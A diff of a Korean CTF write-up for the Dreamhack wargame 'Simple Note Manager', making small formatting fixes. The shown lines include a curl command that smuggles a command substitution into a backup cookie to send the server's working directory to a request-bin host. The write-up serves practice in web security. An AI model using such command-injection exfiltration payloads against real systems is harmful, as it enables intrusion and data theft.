@@ -18,7 +18,7 @@ description: 드림핵 Simple Note Manager 웹해킹 워게임 풀이
 # 문제 풀이
 ## 웹사이트 분석
 ### main page
-![simple note manager main](https://1drv.ms/i/c/5cb37aa515b56a00/IQTbc4AMTjNzS5-lH8ETfNTVAd99hpUwYl__yecs0wHggLk?width=660)
+![simple note manager main](https://1drv.ms/i/c/5cb37aa515b56a00/IQTbc4AMTjNzS5-lH8ETfNTVAd99hpUwYl__yecs0wHggLk?width=660)<br />
 메인 페이지에 접속해보면 기본적 CRUD 기능을 갖춘 노트 관리 서비스를 제공한다.<br />
 Create으로 노트를 생성하고 생성된 노트의 인덱스로 Update 혹은 Delete가 가능하다.<br />
 Backup의 기능은 지금까지 작성한 노트들을 백업하는거 같은데 백업된 파일을 어디서 보는지 알 수가 없다.
@@ -186,7 +186,7 @@ Request Bin에 아무것도 들어오지 않는다.
 curl -X POST http://host3.dreamhack.games:12336/backup_notes --cookie "backup-timestamp=$(curl https://uutbsux.request.dreamhack.games -d {`pwd`})"
 ```
 이번엔 페이로드를 이렇게 작성해보니까 제대로 값이 Request Bin에 전달되기는 하나 내 터미널의 값이 넘어가서 이 방법도 안될 것 같다. <br />
-`$(curl https://uutbsux.request.dreamhack.games -d {``pwd``})` 이 값이 서버로 넘어가서 실행이 돼야하는데 내 컴퓨터에서 실행이 된 체로 넘어가서 쓸 수가 없다.
+`$(curl https://uutbsux.request.dreamhack.games -d {\`pwd\`})` 이 값이 서버로 넘어가서 실행이 돼야하는데 내 컴퓨터에서 실행이 된 체로 넘어가서 쓸 수가 없다.
 #### 세 번째 시도
 ```python
 import requests
